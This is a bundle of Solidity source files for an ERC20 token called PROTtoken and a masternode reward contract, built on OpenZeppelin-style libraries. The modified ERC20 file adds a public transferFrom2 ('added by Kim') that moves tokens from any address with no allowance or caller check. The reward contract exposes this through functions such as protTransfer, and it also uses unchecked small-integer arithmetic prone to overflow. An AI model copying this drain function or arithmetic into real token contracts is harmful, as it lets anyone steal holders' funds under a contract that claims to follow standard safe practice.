{"Context.sol":{"content":"pragma solidity ^0.4.24;\n\n/*\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with GSN meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\ncontract Context {\n    // Empty internal constructor, to prevent people from mistakenly deploying\n    // an instance of this contract, which should be used via inheritance.\n    constructor () internal { }\n    // solhint-disable-previous-line no-empty-blocks\n\n    function _msgSender() internal view returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}"},"ERC20Detailed.sol":{"content":"pragma solidity ^0.4.24;\n\nimport \"./IERC20.sol\";\n\n/**\n * @dev Optional functions from the ERC20 standard.\n */\ncontract ERC20Detailed is IERC20 {\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    /**\n     * @dev Sets the values for `name`, `symbol`, and `decimals`. All three of\n     * these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor (string memory name, string memory symbol, uint8 decimals) public {\n        _name = name;\n        _symbol = symbol;\n        _decimals = decimals;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n}"},"ERC20_mod.sol":{"content":"pragma solidity ^0.4.24;\n\nimport \"./Context.sol\";\nimport \"./IERC20.sol\";\nimport \"./SafeMath.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20Mintable}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n * \n * We have followed general OpenZeppelin guidelines: functions revert instead\n * of returning `false` on failure. This behavior is nonetheless conventional\n * and does not conflict with the expectations of ERC20 applications.\n *  \n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn\u0027t required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\ncontract ERC20_mod is Context, IERC20 {\n    using SafeMath for uint256;\n\n    mapping (address =\u003e uint256) private _balances;\n\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20};\n     *\n     * Requirements:\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for `sender`\u0027s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n    \n    // added by Kim\n    \n    function transferFrom2(address sender, address recipient, uint256 amount) public returns (bool) {\n        _transfer(sender, recipient, amount);\n        \n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    }\n\n    /**\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n     *\n     * This is internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *  \n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `to` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _totalSupply = _totalSupply.add(amount);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n     *\n     * This is internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *  \n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted\n     * from the caller\u0027s allowance.\n     *\n     * See {_burn} and {_approve}.\n     */\n    function _burnFrom(address account, uint256 amount) internal {\n        _burn(account, amount);\n        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, \"ERC20: burn amount exceeds allowance\"));\n    }\n}"},"IERC20.sol":{"content":"pragma solidity ^0.4.24;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP. Does not include\n * the optional functions; to access them see {ERC20Detailed}.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}"},"PROTtoken.sol":{"content":"pragma solidity ^0.4.24;\n\nimport \"./Context.sol\";\nimport \"./ERC20_mod.sol\";\nimport \"./ERC20Detailed.sol\";\n\n/**\n * @title SimpleToken\n * @dev Very simple ERC20 Token example, where all tokens are pre-assigned to the creator.\n * Note they can later distribute these tokens as they wish using `transfer` and other\n * `ERC20` functions.\n */\ncontract PROTtoken is Context, ERC20_mod, ERC20Detailed {\n    \n    uint256 public totalSupplyofToken;\n    address private owner;\n    \n    modifier onlyOwner () {\n        require(_msgSender() == owner);\n        _;\n    }\n    \n    /**\n     * @dev Constructor that gives _msgSender() all of existing tokens.\n     */\n    constructor () public ERC20Detailed(\"PROTtoken\", \"prot\", 18) {\n        \n        owner = _msgSender();\n        totalSupplyofToken = 1212000000 * (10 ** uint256(decimals()));\n        _mint(_msgSender(), totalSupplyofToken);\n    }\n    \n    function mint_GLEX(uint256 _amount) public onlyOwner {\n        uint256 mint_amount = _amount * (10 ** uint256(decimals()));\n        _mint(_msgSender(), mint_amount);\n    } \n    \n    function burn_GLEX(uint256 _amount) public onlyOwner {\n        uint256 burn_amount = _amount * (10 ** uint256(decimals()));\n        _burn(_msgSender(), burn_amount);\n    }\n}"},"PROT_MN_reward.sol":{"content":"pragma solidity ^0.4.24;\n\nimport \"./PROTtoken.sol\";\n\ncontract PROT_MN_reward {\n    \n    struct UserInfo {\n        uint16 mnCnt;\n        uint32 tokenCnt;\n        uint256 applyTime;\n        uint32 totalReward;\n        uint32 unPayedReward;\n        uint32 payedReward;\n    }\n    \n    uint256 public deployTime;\n    uint32 private totalUserReward;\n    uint16 public totalMNcount = 0;\n    uint256 private constant aMonth = 1 * 30 days;\n    uint24 public  constant tokenPerMN = 50000;\n    uint8 private constant applyMNcount = 1;\n    uint8 private constant withdrawMNcount = 1;\n    uint16 private constant dailyRewardCount = 1440;\n    uint16[11] private rewardLevel = [\n         36, // 1 month\n         48, // 2 month\n         40, // 3 month\n         60, // 4 month\n         80, // 5 month\n         84, // 6 month\n         92, // 8 month\n         96, // 10 month\n        100, // 12 month\n         72, // 24 month\n         36  // after 24 month\n    ];\n    \n    mapping (address =\u003e UserInfo) public user; \n    address[] internal users;\n    address private owner;\n    \n    PROTtoken public protToken;\n    \n    modifier onlyOwner () {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    constructor() public {\n        deployTime = now + (1 * 7 days);\n        owner = msg.sender;\n    }\n    \n    function () external payable{\n        if(msg.value \u003c= 0){\n            revert();\n        }\n    }\n    \n    function getOwner() public onlyOwner view returns(address){\n        return owner;\n    }\n    \n    function setPROTtoken (address _addr) public onlyOwner {\n        protToken = PROTtoken(_addr);    \n    }\n    \n    //ok - user function\n    function applyMasternode() public returns (bool) {\n        \n        require(protToken.balanceOf(msg.sender) \u003e= applyMNcount * tokenPerMN);\n        \n        bool result = saveUserInfo(msg.sender);\n        \n        protToken.transferFrom2(msg.sender, address(this), applyMNcount * tokenPerMN * 10 ** uint256(protToken.decimals()));\n        \n        return result;\n    }\n    \n    \n    //ok\n    function saveUserInfo(address _user) private returns(bool) {\n        \n        if(applyMNcount != 1) { revert();}\n        \n        //existing account flag\n        uint8 chkUser;\n        \n        for(uint16 i=0; i\u003cusers.length; i++){\n            if(users[i] == _user){\n                chkUser += 1;\n            }\n        }\n        \n        if(chkUser == 0){  //first masternode apply\n            users.push(_user); \n            user[_user].applyTime = now;\n        }else if(chkUser != 0 \u0026\u0026 user[_user].applyTime == 0){  //masternode re-apply\n            user[_user].applyTime = now;\n        }\n        \n        user[_user].mnCnt    += applyMNcount;\n        user[_user].tokenCnt += applyMNcount * tokenPerMN;\n        \n        totalMNcount += applyMNcount;\n        \n        return true;\n    }    \n    \n    //ok - automatical apply\n    function applyMasternode2(address _user,uint16 _mnCnt) public onlyOwner returns (bool) {\n        \n        require(protToken.balanceOf(owner) \u003e= _mnCnt * tokenPerMN);\n        \n        bool result = saveUserInfo2(_user, _mnCnt);\n        \n        protToken.transferFrom2(owner, address(this), _mnCnt * tokenPerMN * 10 ** uint256(protToken.decimals()));\n        \n        return result;\n    }\n    \n    //ok - automatical apply\n    function saveUserInfo2(address _user, uint16 _mnCnt) private returns(bool) {\n        \n        if(_mnCnt \u003c= 0) { revert();}\n        \n        uint8 chkUser;\n        \n        for(uint16 i=0; i\u003cusers.length; i++){\n            if(users[i] == _user){\n                chkUser += 1;\n            }\n        }\n        \n        if(chkUser == 0){ \n            users.push(_user); \n            \n            user[_user].mnCnt     = _mnCnt;\n            user[_user].tokenCnt  = _mnCnt * tokenPerMN;\n            user[_user].applyTime = now;    \n        }else{\n            user[_user].mnCnt    += _mnCnt;\n            user[_user].tokenCnt += _mnCnt * tokenPerMN;\n        }\n        \n        totalMNcount += _mnCnt;\n        \n        return true;\n    }\n    \n    //ok\n    function dailyReward(uint16 _startNum, uint16 _endNum, uint8 _period) public onlyOwner returns(uint32, uint16) {\n        uint32 todayReward;\n        uint16 rewardUsers;\n        \n        (todayReward, rewardUsers) = masterNodeReward(_startNum, _endNum, _period);\n        \n        \n        // protToken.transferFrom2(owner, address(this), todayReward * 10 ** uint256(protToken.decimals()));\n        \n        return (todayReward, rewardUsers);\n    }\n    \n    //ok\n    function masterNodeReward(uint16 _startNum, uint16 _endNum, uint8 _period) private returns(uint32, uint16){\n        \n        uint32 thisTimeTotalReward;\n        uint16 userCnt;\n        uint32 _todayNodeReward_ = todayPerNodeReward() * _period;\n\n        if(users.length == 0){\n            revert();\n        }else{\n            for(uint16 i=_startNum; i\u003c=_endNum; i++){\n                if(user[users[i]].mnCnt \u003e 0){\n                    user[users[i]].totalReward   += user[users[i]].mnCnt * _todayNodeReward_;\n                    user[users[i]].unPayedReward += user[users[i]].mnCnt * _todayNodeReward_;\n                    \n                    thisTimeTotalReward += user[users[i]].mnCnt * _todayNodeReward_;\n                    userCnt++;\n                    totalUserReward += thisTimeTotalReward;\n                }\n            }\n        }\n        \n        return (thisTimeTotalReward, userCnt); \n    }\n    \n    //ok\n    function withdraw(uint32 _amount) public returns(uint256){\n        \n        uint32 amount = _amount;\n        \n        if(amount \u003e user[msg.sender].unPayedReward) {revert();}\n        \n        applyWithdraw(msg.sender, amount);\n        \n        protToken.transferFrom2(address(this), msg.sender, amount * 10 ** uint256(protToken.decimals()));\n        \n        return protToken.balanceOf(msg.sender);\n    }\n    \n    //ok user function\n    function withdrawMasterNode() public returns(uint256){\n        \n        uint32 withdrawAmount = withdrawMNcount * tokenPerMN;\n        \n        if(withdrawMNcount \u003e user[msg.sender].mnCnt) {revert();}\n        \n        user[msg.sender].mnCnt -= withdrawMNcount;\n                                    \n        user[msg.sender].tokenCnt -= withdrawAmount;\n        \n        //totally close\n        if(user[msg.sender].mnCnt == 0 \u0026\u0026 user[msg.sender].tokenCnt == 0){\n            withdrawAmount += user[msg.sender].unPayedReward;\n            user[msg.sender].applyTime     = 0;\n            user[msg.sender].totalReward   = 0;\n            user[msg.sender].unPayedReward = 0;\n            user[msg.sender].payedReward   = 0;\n        }\n        \n        protToken.transferFrom2(address(this), msg.sender, withdrawAmount  * 10 ** uint256(protToken.decimals()));\n        \n        return protToken.balanceOf(msg.sender);   \n    }\n    \n    //ok\n    function applyWithdraw(address _addr, uint32 _amount) private {\n        \n        user[_addr].unPayedReward -= _amount;\n        user[_addr].payedReward   += _amount;\n        \n    }\n    \n    //ok - user function\n    function closeMNandWithdrawl() public returns(uint256){\n        \n        uint256 closeMNandToken = (user[msg.sender].mnCnt * tokenPerMN) + user[msg.sender].unPayedReward;\n        \n        totalMNcount -= user[msg.sender].mnCnt;\n        \n        user[msg.sender].mnCnt         = 0;\n        user[msg.sender].tokenCnt      = 0;\n        user[msg.sender].applyTime     = 0;\n        user[msg.sender].totalReward   = 0;\n        user[msg.sender].unPayedReward = 0;\n        user[msg.sender].payedReward   = 0;\n        \n        protToken.transferFrom2(address(this), msg.sender, closeMNandToken * 10 ** uint256(protToken.decimals()));\n        \n        return protToken.balanceOf(msg.sender);\n    }\n\n    // added\n    function modUserMNstatus(address _user, uint16 _mnCnt, uint32 _totalReward) public onlyOwner returns (bool){\n        \n        uint16 userIdx = searchUserIndex(_user);\n        \n        if(userIdx == 65535){ \n            \n            revert(); \n            \n        }else{\n            \n            user[_user].mnCnt         = _mnCnt;\n            user[_user].tokenCnt      = _mnCnt * tokenPerMN;\n            user[_user].totalReward   = _totalReward;\n            user[_user].unPayedReward = _totalReward - user[_user].payedReward;\n            \n            return true;\n        }\n    }\n    \n    function getUserInfo(address _user) public view returns (uint256, uint256, uint256, uint256, uint256, uint256) {\n      \n        return (\n            user[_user].mnCnt, \n            user[_user].tokenCnt, \n            user[_user].applyTime, \n            user[_user].totalReward, \n            user[_user].unPayedReward, \n            user[_user].payedReward\n        );\n    }\n    \n    //ok - user function\n    function getMyInfo() public view returns (uint256, uint256, uint256, uint256, uint256, uint256) {\n      \n        return (\n            user[msg.sender].mnCnt, \n            user[msg.sender].tokenCnt, \n            user[msg.sender].applyTime, \n            user[msg.sender].totalReward, \n            user[msg.sender].unPayedReward, \n            user[msg.sender].payedReward\n        );\n    }\n    \n    function getTotalMNcount() public view returns(uint256){\n        return totalMNcount;\n    }\n    \n    function getBalanceInfo() public view returns(uint256, uint256){\n        \n        uint256 tokenBalance = protToken.balanceOf(address(this));\n        uint256 ethBalance   = address(this).balance;\n        \n        return (tokenBalance,ethBalance);\n    }\n    \n    function getTotalUsersReward() public view returns(uint256){\n        return totalUserReward;\n    }\n    \n    function getEachUserReward(address _addr) public view returns(uint256, uint256){ \n        return (user[_addr].totalReward, user[_addr].unPayedReward);\n    }\n    \n    //ok - user function\n    function getCurrentReward() public view returns(uint16){\n        if(now \u003c= deployTime + aMonth){return rewardLevel[0];}    //36\n        else if(now \u003e deployTime + aMonth \u0026\u0026 now \u003c= deployTime + (aMonth * 2)){return rewardLevel[1];}       //48\n        else if(now \u003e deployTime + (aMonth * 2) \u0026\u0026 now \u003c= deployTime + (aMonth * 3)){return rewardLevel[2];} //40\n        else if(now \u003e deployTime + (aMonth * 3) \u0026\u0026 now \u003c= deployTime + (aMonth * 4)){return rewardLevel[3];} //60 \n        else if(now \u003e deployTime + (aMonth * 4) \u0026\u0026 now \u003c= deployTime + (aMonth * 5)){return rewardLevel[4];} //80\n        else if(now \u003e deployTime + (aMonth * 5) \u0026\u0026 now \u003c= deployTime + (aMonth * 6)){return rewardLevel[5];} //84\n        else if(now \u003e deployTime + (aMonth * 6) \u0026\u0026 now \u003c= deployTime + (aMonth * 8)){return rewardLevel[6];} //92\n        else if(now \u003e deployTime + (aMonth * 8) \u0026\u0026 now \u003c= deployTime + (aMonth * 10)){return rewardLevel[7];} //96\n        else if(now \u003e deployTime + (aMonth * 10) \u0026\u0026 now \u003c= deployTime + (aMonth * 12)){return rewardLevel[8];} //100\n        else if(now \u003e deployTime + (aMonth * 12) \u0026\u0026 now \u003c= deployTime + (aMonth * 24)){return rewardLevel[9];} //72 \n        else if(now \u003e deployTime + (aMonth * 24) \u0026\u0026 now \u003c= deployTime + (aMonth * 84)){return rewardLevel[10];} //36\n        else{ return 0;}\n    }\n    \n    //ok - user function\n    function getTotalSupply() public view returns(uint256){\n        return protToken.totalSupply();\n    } \n    \n    function getBalanceOf(address _user) public view returns(uint256){\n        return protToken.balanceOf(_user);\n    }\n    \n    //ok\n    function todayPerNodeReward() private view returns(uint32){\n    \n        uint32 todayReward = ((dailyRewardCount * getCurrentReward()) / totalMNcount);\n        \n        return todayReward;\n    }\n    \n    //ok - user function\n    function getMyBalance() public view returns(uint256){\n        return protToken.balanceOf(msg.sender);\n    }\n    \n    //important\n    function withdrawEth() public onlyOwner returns(bool){\n        address(msg.sender).transfer(address(this).balance);\n    }\n    \n    //important\n    function withdrawPROTbalance(uint32 _amount) public onlyOwner returns(bool){\n        \n        protToken.transferFrom2(address(this), owner , _amount * 10 ** uint256(protToken.decimals()));\n        \n        return true;\n    }\n    \n    //ok - user function\n    function protTransfer(address _recipient, uint32 _amount) public returns(bool) {\n        \n        protToken.transferFrom2(msg.sender, _recipient , _amount * 10 ** uint256(protToken.decimals()));\n        \n        return true;\n    }\n    \n    function getUsersLength() public view returns(uint256){\n        return users.length;    \n    }\n    \n    function getUserInfoByIndex(uint256 _index) public view returns(address, uint256){\n        \n        address userAccount = users[_index]; \n        \n        return (userAccount, user[userAccount].mnCnt);\n        \n    }\n\n    //added\n    function searchUserIndex(address _user) public view returns(uint16) {\n        \n        for(uint16 i=0; i\u003cusers.length; i++){\n            if(users[i] == _user){\n                return i;\n            }\n        }\n        \n        return 65535;\n    }\n}"},"SafeMath.sol":{"content":"pragma solidity ^0.4.24;\n\n/**\n * @dev Wrappers over Solidity\u0027s arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it\u0027s recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity\u0027s `+` operator.\n     *\n     * Requirements:\n     * - Addition cannot overflow.\n     */  \n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c \u003e= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity\u0027s `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity\u0027s `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     *\n     * _Available since v2.4.0._\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b \u003c= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity\u0027s `*` operator.\n     *\n     * Requirements:\n     * - Multiplication cannot overflow.\n     */\n        function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\n        // benefit is lost if \u0027b\u0027 is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     *\n     * _Available since v2.4.0._\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        // Solidity only automatically asserts when dividing by 0\n        require(b \u003e 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     *\n     * _Available since v2.4.0._\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}"}}